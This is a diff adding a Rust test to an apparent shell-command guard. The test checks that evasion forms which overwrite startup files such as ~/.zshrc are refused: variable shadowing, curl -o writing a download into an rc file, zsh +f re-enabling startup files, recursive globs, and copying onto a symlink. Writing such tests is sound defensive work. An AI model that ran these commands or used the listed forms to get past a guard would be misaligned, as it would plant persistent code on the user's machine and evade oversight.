@@ -436,3 +436,59 @@ fn the_text_floor_reads_names_not_substrings() {
         assert!(class.named_in(text).is_none(), "{text}");
     }
 }
+
+/// The forms the first holistic review found passing (TSK-242, round one):
+/// a reassigned or argument-shadowed variable, a relative run-time name in
+/// the home, an attached option value, a copy landing on a link, a `+f`
+/// that turns zsh's startup files back on, and a recursive glob. Each
+/// passed at 3a8065d76.
+#[test]
+fn review_round_one_forms_refuse() {
+    let f = Fixture::new();
+    let out = f.project.join("out");
+    std::fs::create_dir_all(&out).unwrap();
+    #[cfg(unix)]
+    std::os::unix::fs::symlink(f.home.join(".zshrc"), out.join("payload")).unwrap();
+    let mut wrong = Vec::new();
+    let mut refuse = vec![
+        "p=~/.zshrc; echo x > \"$p\"; p=notes",
+        "p=~/.zshrc; echo p=notes; echo x > \"$p\"",
+        // `cd H/`: run_dirs reads `~` from the process, not the fixture.
+        "cd H/; echo x > \"$DEST\"",
+        "curl -s -o$HOME/.zshrc https://example.invalid/x",
+        "curl -so~/.bashrc https://example.invalid/x",
+        "ZDOTDIR=/tmp/z zsh +f -c true",
+        "ZDOTDIR=/tmp/z zsh -f +f -c true",
+        "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
+        "ZDOTDIR=/tmp/z zsh +o norcs -c true",
+        "echo x > ~/**/.zshrc",
+        "rg --pre ./x alias ~/.zshrc",
+    ];
+    if cfg!(unix) {
+        refuse.push("cp payload out/");
+    }
+    for command in refuse {
+        if !refused(&f.judge(command)) {
+            wrong.push(format!("allowed: {command}"));
+        }
+    }
+    if !refused(&f.judge_in("echo x > \"$DEST\"", &f.home, &f.env())) {
+        wrong.push("allowed from the home: echo x > \"$DEST\"".to_string());
+    }
+    for command in [
+        "p=notes; echo x > \"$p\"",
+        "echo x > \"$DEST\"",
+        "ZDOTDIR=/tmp/z zsh -fc true",
+        "ZDOTDIR=/tmp/z zsh -f +x -c true",
+        "ZDOTDIR=/tmp/z zsh -o norcs -c true",
+        "rg --no-config alias ~/.zshrc",
+        "rm -rf build/**/tmp",
+        "cp notes.txt out/",
+    ] {
+        let found = f.judge(command);
+        if refused(&found) {
+            wrong.push(format!("refused: {command}: {}", found[0].message));
+        }
+    }
+    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
+}
